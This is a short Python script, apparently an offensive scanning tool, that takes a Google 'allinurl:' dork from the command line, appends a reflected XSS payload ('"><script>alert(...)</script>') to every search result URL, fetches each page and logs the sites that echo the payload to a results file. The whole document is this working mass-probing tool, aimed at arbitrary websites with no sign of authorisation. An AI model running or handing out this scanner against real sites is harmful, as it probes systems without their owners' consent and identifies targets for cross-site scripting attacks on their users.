import sys,os
import requests
from googlesearch import search


f = open("results-XSS.txt",'a+')

links = search("allinurl:" + sys.argv[1], num = int(sys.argv[2]))



for link in links:
        try:
                link = link + "\"><script>alert(123456789);</script>"
                page = requests.get(link, timeout = 3)
                if page.text.find("alert(123456789);") >= 1:
                        print ("[+] found XSS on " + link)
                        f.write(link + '\n')
                else:
                        print ("[-] nothing found in " + link)



        except Exception as e:
                pass
